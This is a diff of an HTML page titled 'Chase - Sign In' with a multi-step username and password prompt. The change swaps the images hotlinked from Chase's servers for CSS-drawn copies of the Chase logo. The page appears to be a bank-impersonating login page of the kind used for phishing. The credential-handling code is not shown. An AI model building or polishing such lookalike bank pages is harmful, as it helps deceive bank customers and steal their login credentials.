@@ -6,15 +6,37 @@
 <title>Chase - Sign In</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { font-family: Arial, Helvetica, sans-serif; background: #f7f7f7; }
+  body {
+    font-family: Arial, Helvetica, sans-serif;
+    background: #f7f7f7;
+  }
   .header {
     background: #0b5cab;
     padding: 12px 20px;
     display: flex;
     align-items: center;
+    justify-content: flex-start;
   }
-  .header img {
-    height: 30px;
+  .chase-logo {
+    width: 36px;
+    height: 36px;
+    background: #ffffff;
+    clip-path: polygon(50% 0%, 93% 25%, 93% 75%, 50% 100%, 7% 75%, 7% 25%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-right: 8px;
+  }
+  .chase-logo span {
+    color: #0b5cab;
+    font-size: 14px;
+    font-weight: bold;
+  }
+  .header-text {
+    color: #ffffff;
+    font-size: 20px;
+    font-weight: bold;
+    letter-spacing: 0.5px;
   }
   .container {
     max-width: 400px;
@@ -28,9 +50,20 @@
   .logo-row {
     margin-bottom: 20px;
   }
-  .logo-row img {
-    width: 120px;
-    height: auto;
+  .chase-logo-large {
+    width: 80px;
+    height: 80px;
+    background: #0b5cab;
+    clip-path: polygon(50% 0%, 93% 25%, 93% 75%, 50% 100%, 7% 75%, 7% 25%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto;
+  }
+  .chase-logo-large span {
+    color: #ffffff;
+    font-size: 22px;
+    font-weight: bold;
   }
   h2 {
     color: #0b5cab;
@@ -97,12 +130,13 @@
 <body>
 
 <div class="header">
-  <img src="https://account.chase.com/themes/custom/jpmc/img/chase_logo_h_rgb.png" alt="Chase">
+  <div class="chase-logo"><span>CHASE</span></div>
+  <span class="header-text">CHASE</span>
 </div>
 
 <div class="container" id="step1">
   <div class="logo-row">
-    <img src="https://account.chase.com/themes/custom/jpmc/img/chase_logo_h_rgb.png" alt="Chase">
+    <div class="chase-logo-large"><span>CHASE</span></div>
   </div>
   <h2>Sign in to your account</h2>
   <p class="subtitle">Enter your username and password</p>
